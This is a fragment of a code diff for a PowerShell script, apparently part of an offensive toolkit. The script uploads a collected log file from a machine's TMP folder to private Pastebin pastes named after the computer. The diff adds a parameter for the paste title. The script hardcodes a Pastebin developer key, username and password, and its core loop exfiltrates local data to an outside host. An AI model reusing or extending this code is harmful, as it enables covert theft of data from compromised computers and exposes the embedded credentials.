@@ -83,6 +83,7 @@
 [CmdletBinding(PositionalBinding=$false)] param(
    [string]$PastebinDeveloperKey='1ab4a1a4e39c94db4f653127a45e7159',
    [string]$PastebinUsername="r00t-3xp10it",
+   [string]$PasteTitle="$Env:COMPUTERNAME",
    [string]$FilePath="$Env:TMP\void.log",
    [string]$PastebinPassword="s3cr3t",
    [string]$Egg="False",
@@ -155,7 +156,7 @@ For($i=0; $i -lt $MaxPastes; $i++)
          #Import \ Execute module
          $rand = (Get-Date -Format 'HH:mm:ss') -replace ':','_'
          Import-Module -Name "$Env:TMP\Out-PasteBin.ps1" -Force
-         Out-Pastebin -InputObject $(Get-Content -Path "$Env:TMP\ParseData.log") -PasteTitle "${Env:COMPUTERNAME}_${rand}" -ExpiresIn "1W" -Visibility "Private" -PastebinUsername "$PastebinUsername" -PastebinPassword "$PastebinPassword" -PastebinDeveloperKey "$PastebinDeveloperKey"
+         Out-Pastebin -InputObject $(Get-Content -Path "$Env:TMP\ParseData.log") -PasteTitle "${PasteTitle}_${rand}" -ExpiresIn "1W" -Visibility "Private" -PastebinUsername "$PastebinUsername" -PastebinPassword "$PastebinPassword" -PastebinDeveloperKey "$PastebinDeveloperKey"
       }
       Catch
       {
